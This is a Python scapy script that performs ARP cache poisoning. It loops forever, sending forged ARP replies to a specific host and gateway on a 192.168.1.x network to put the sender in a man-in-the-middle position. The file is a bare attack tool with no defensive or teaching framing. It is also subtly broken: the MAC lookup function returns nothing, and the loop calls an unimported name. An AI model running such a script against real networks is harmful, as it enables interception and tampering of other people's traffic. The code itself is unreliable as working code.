#!/usr/bin/env python3

import sys as s
import scapy.all as scapy
import time as t
#import argparse as argp

#def get_arguments:


def get_mac_addr(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    #print(answered_list[0][1].hwsrc)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac_addr(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
        psrc=spoof_ip)
    scapy.send(packet, verbose=False)

sent_packets_count = 0
while True:
    spoof("192.168.1.228", "192.168.1.1")
    spoof("192.168.1.1", "192.168.1.228")
    sent_packets_count += 2
    print("\r[+] Packets sent: " + str(sent_packets_count), end=''),
    s.stdout.flush()
    time.sleep(2)
